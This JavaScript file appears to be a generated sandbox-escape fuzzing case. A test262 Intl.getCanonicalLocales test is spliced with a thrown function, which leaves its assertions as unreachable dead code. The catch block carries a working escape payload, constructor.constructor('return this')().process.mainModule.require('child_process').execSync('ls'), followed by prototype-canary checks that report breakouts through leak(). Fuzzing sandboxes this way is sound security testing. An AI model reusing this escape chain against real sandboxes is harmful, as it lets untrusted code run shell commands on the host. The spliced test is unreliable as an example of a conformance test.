try {
    var canonicalizedTags = { 'ja-latn-hepburn-heploc': 'ja-Latn-alalc97' };
    Object.getOwnPropertyNames(canonicalizedTags).forEach(function (tag) {
        throw () => {
            return () => {
            };
        };
        var canonicalizedTag = canonicalizedTags[tag];
        assert(isCanonicalizedStructurallyValidLanguageTag(canonicalizedTag), 'Test data "' + canonicalizedTag + '" is not canonicalized and structurally valid language tag.');
    });
    Object.getOwnPropertyNames(canonicalizedTags).forEach(function (tag) {
        var canonicalLocales = Intl.getCanonicalLocales(tag);
        assert.sameValue(canonicalLocales.length, 1);
        assert.sameValue(canonicalLocales[0], canonicalizedTags[tag]);
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}